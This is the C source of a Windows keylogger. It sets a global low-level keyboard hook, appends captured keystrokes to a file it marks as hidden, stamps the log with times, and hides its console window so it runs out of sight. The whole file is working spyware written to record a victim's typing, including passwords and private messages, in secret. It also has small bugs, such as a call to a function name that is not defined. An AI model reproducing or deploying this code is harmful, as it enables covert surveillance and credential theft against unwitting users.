#include "keylogger.h"

// Initialize empty hook
HHOOK hook = NULL;

// Tracks amount of characters per line
int charCount = 0;

// Keylogging hook that logs low level keystrokes
LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    FILE *f;

    // Open keylog file in append mode
    f = fopen("log", "a+");

    if (nCode < 0)
    {
        CallNextHookEx(hook, nCode, wparam, lparam);
    }

    KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*) lparam;

    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        // Logs alphanumeric keys
        if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A)
        {
            char c = (char) kb->vkCode;
            fprintf(f, "%c", c);
        }
        // Logs other common keys
        else
        {
            switch (kb->vkCode)
            {
                case VK_RETURN:
                    fprintf(f, "\n");
                    // Reset character counter when user enters new line
                    charCount = 0;
                    break;
                case VK_SPACE:
                    fprintf(f, " ");
                    break;
                case VK_OEM_PERIOD:
                    fprintf(f, ".");
                    break;
                case VK_OEM_COMMA:
                    fprintf(f, ",");
                    break;
                case VK_OEM_7:
                    fprintf(f, "'");
                    break;
                default:
                    fprintf(f, "");
                    break;
            };
        }
        // Creates a new line if more than 80 characters entered
        charCount++;
        if (charCount > 80)
        {
            fprintf(f, "\n");
            charCount = 0;
        }
    }

    fclose(f);

    return CallNextHookEx(hook, nCode, wparam, lparam);
}

int set_keylog_hook()
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeylogProc, GetModuleHandle(NULL), 0);

    return hook == NULL;
}

int remove_keylog_hook()
{
    int unhook_status = UnhookWindowsHookEx(hook);

    hook = NULL;

    return unhook_status;
}

void hide_log_file()
{
    DWORD attributes = GetFileAttributes("log");
    SetFileAttributes("log", attributes + FILE_ATTRIBUTE_HIDDEN);
}

void write_timestamp_to_log_file()
{
    FILE *f;

    f = fopen("log", "a+");

    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    fprintf(f, "\n\nCurrent Time: %d-%d-%d %d:%d:%d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

    fclose(f);
}

void init_log_file()
{
    write_timestamp_to_log_file();
    hide_log_file();
}

int main()
{
    MSG msg;

    // Hides console window
    ShowWindow(GetConsoleWindow(), 0);

    // Initializes log file
    init_log_file();

    // Error handling for keylog hook creation
    if (set_keylog_hook() != 0)
    {
        fprintf(stderr, "Error setting keylog hook.\n\n");
        exit(EXIT_FAILURE);
    }

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Error handling for keylog hook removal
    if (removeKeylogHook() != 0)
    {
        fprintf(stderr, "Error removing keylog hook.\n\n");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}

